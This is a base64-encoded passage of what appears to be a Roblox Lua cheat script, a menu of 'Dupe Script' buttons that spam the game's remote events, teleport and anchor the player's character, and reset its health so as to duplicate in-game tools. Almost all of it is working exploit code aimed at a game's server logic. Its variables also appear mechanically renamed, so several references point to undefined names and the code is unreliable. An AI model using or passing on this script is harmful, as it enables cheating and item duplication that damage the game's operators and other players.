CAgICAgICAgIFZlY3RvcjMubmV3KDYsIC0xNCwgMCksIFZlY3RvcjMubmV3KDcsIC0xNCwgMCksIFZlY3RvcjMubmV3KDgsIC0xNCwgMCksIFZlY3RvcjMubmV3KDksIC0xNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwLCAtMTQsIDApLCBWZWN0b3IzLm5ldygxMSwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMTIsIC0xNCwgMCksIFZlY3RvcjMubmV3KDEzLCAtMTQsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygxNCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMTUsIC0xNCwgMCksIFZlY3RvcjMubmV3KDE2LCAtMTQsIDApLCBWZWN0b3IzLm5ldygxNywgLTE0LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTgsIC0xNCwgMCksIFZlY3RvcjMubmV3KDE5LCAtMTQsIDApLCBWZWN0b3IzLm5ldygyMCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0xNiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAtMTgsIDApLCBWZWN0b3IzLm5ldygyMCwgLTIwLCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0yMiwgMCksIFZlY3RvcjMubmV3KDIwLCAtMjQsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyMCwgLTI2LCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0yOCwgMCksIFZlY3RvcjMubmV3KDIwLCAtMzAsIDApLCBWZWN0b3IzLm5ldygxMCwgLTMwLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTAsIC0yOCwgMCksIFZlY3RvcjMubmV3KDEwLCAtMjYsIDApLCBWZWN0b3IzLm5ldygxMCwgLTI0LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0yMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwLCAtMjAsIDApLCBWZWN0b3IzLm5ldygxMCwgLTE4LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0xNiwgMCksIFZlY3RvcjMubmV3KDEwLCAtMTQsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygxMCwgLTEyLCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0xMCwgMCksIFZlY3RvcjMubmV3KDEwLCAtOCwgMCksIFZlY3RvcjMubmV3KDEwLCAtNiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwLCAtNCwgMCksIFZlY3RvcjMubmV3KDEwLCAtMiwgMCksIFZlY3RvcjMubmV3KDExLCAtMiwgMCksIFZlY3RvcjMubmV3KDEyLCAtMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzLCAtMiwgMCksIFZlY3RvcjMubmV3KDE0LCAtMiwgMCksIFZlY3RvcjMubmV3KDE1LCAtMiwgMCksIFZlY3RvcjMubmV3KDE2LCAtMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDE3LCAtMiwgMCksIFZlY3RvcjMubmV3KDE4LCAtMiwgMCksIFZlY3RvcjMubmV3KDE5LCAtMiwgMCksIFZlY3RvcjMubmV3KDIwLCAtMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIC0zMCwgMCksIFZlY3RvcjMubmV3KDAsIC0zMCwgMCksIFZlY3RvcjMubmV3KDIsIC0zMCwgMCksIFZlY3RvcjMubmV3KDMsIC0zMCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIC0zMCwgMCksIFZlY3RvcjMubmV3KDUsIC0zMCwgMCksIFZlY3RvcjMubmV3KDYsIC0zMCwgMCksIFZlY3RvcjMubmV3KDcsIC0zMCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDgsIC0zMCwgMCksIFZlY3RvcjMubmV3KDksIC0zMCwgMCkKICAgICAgICB9CiAgICAgICAgZm9yIF8sIHBvcyBpbiBpcGFpcnMoZ3JpcFBvc2l0aW9ucykgZG8KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gZ3JpcEJhc2UgKyBwb3MKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gbmFtZXRvb2xzCiAgICAgICAgZW5kCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmcmFtZQogICAgICAgIHdhaXQoMC41KQogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gbmFtZXRvb2xzIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJMaWdodCBBdXJhIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIG5hbWV0b29scyA9ICJsaWdodCBTcHJheSBsZWwiCiAgICAgICAgICAgICAgICBvbGRjZnJhbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCmdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLHtUaXRsZT0iRHVwZSBTY3JpcHQiLFRleHQ9IlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwgQnV0dG9uMSA9ICJJIHVuZGVyc3RhbmQiICxEdXJhdGlvbj01fSkKICAgICAgICAgICAgICAgIHRvb2x0aGF0aXdhbnR0b2R1cGUgPSAiRmxhc2hMaWdodCIKICAgICAgICAgICAgICAgIHRvb2xzID0gIkZsYXNoTGlnaHQiCiAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl8yZGZibzcgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjbGVhcnRvb2xyZW1vdGU6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3YWl0KDAuMykKICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBtPTEsIDEyNCBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl81bHU2b28gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gdG9vbHRoYXRpd2FudHRvZHVwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBwaWNrdG9vbHJlbW90ZTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHRoYXRpd2FudHRvZHVwZV06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSMOiwiDCpWHDosIgwqVuw6LCIMKlZMOiwiDCpWzDosIgwqVlIgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0ICAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZCB3YWl0KCkgdW50aWwgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpID09IG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgPT0gbmlsCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgdG9vbGdyaXAgPSB0cnVlCiAgICAgICAgICAgICAgICBkdXBpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgd2FpdCgpCmxvY2FsIHZhcl93cTBvcDMgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgdmFyX3VzOHg0YiA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQpsb2NhbCB2YXJfdHR4ZXZ4ID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQoKCnByaW50KCJkb25lIikKd2FpdCgxKQpsb2NhbCB2YXJfajlncTVtID0gewogICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMCksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgMzApLAogICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDE1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAxNSksClZlY3RvcjMubmV3KDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0xNSksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0zMCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTMwKSwKICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTQ1KSwKICAgIFZlY3RvcjMubmV3KDEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC03NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTc1KSwKCgogICAgIH0KICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICBsb2NhbCB2YXJfd3lkcDN6ID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgICBsb2NhbCB2YXJfcXJudG1oID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZiB0b29sOklzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgd2FybigiVG9vbCIsIHRvb2wuTmFtZSwgImlzIG5vdCBpbiBjaGFyYWN0ZXIiKQogICAgICAgICAgICAgIGVuZAogICAgICAgICAgZW5kCiAgICAgIGVuZAogICAgZW5kCn0pCgotLSBCdXR0b24gZm9yIFNtb2tlIEF1cmEKVG9vbHNUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiU21va2UgQXVyYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJEdXBlIFNjcmlwdCIsCiAgICAgICAgICAgIFRleHQgPSAiUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4iLAogICAgICAgICAgICBCdXR0b24xID0gIkkgdW5kZXJzdGFuZCIsCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICAgICAgbG9jYWwgdmFyXzdrOHU5NyA9IHsKICAgICAgICAgICAgWzFdID0gIkNsZWFyQWxsVG9vbHMiCiAgICAgICAgfQogICAgICAgIGNsZWFydG9vbHJlbW90ZTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC4zKQogICAgICAgIGZvciBpID0gMSwgMTI0IGRvCiAgICAgICAgICAgIGxvY2FsIHZhcl92eHZmMnogPSB7CiAgICAgICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgICAgIFsyXSA9ICJGaXJlSG9zZSIKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIGxvY2FsIHZhcl81enB3MnEgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSAiRmlyZUhvc2UiLAogICAgICAgICAgICAgICAgWzJdID0gIkRlc3Ryb3lGaXJlSG9zZSIKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjay5GaXJlSG9zZS5Ub29sU291bmQ6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgZW5kCiAgICAgICAgbG9jYWwgdmFyXzJtMHZpcCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIHZhcl9jZHJraWogPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCB2YXJfNWRzZGdwID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgaHVtYW5vaWQuSGVhbHRoID0gMAogICAgICAgIGVuZAogICAgICAgIHdhaXQoOCkKICAgICAgICBsb2NhbCB2YXJfc2p0c3F6ID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIDApLCBWZWN0b3IzLm5ldygyMCwgMCwgMCksIFZlY3RvcjMubmV3KDMwLCAwLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLCBWZWN0b3IzLm5ldyg1MCwgMCwgMCksIFZlY3RvcjMubmV3KDYwLCAwLCAwKSwgVmVjdG9yMy5uZXcoLTAsIDAsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLCBWZWN0b3IzLm5ldygtMjAsIDAsIDApLCBWZWN0b3IzLm5ldygtMzAsIDAsIDApLCBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtNTAsIDAsIDApLCBWZWN0b3IzLm5ldygtNjAsIDAsIDApLCBWZWN0b3IzLm5ldygwLCAwLCAzMCksIFZlY3RvcjMubmV3KDEwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3R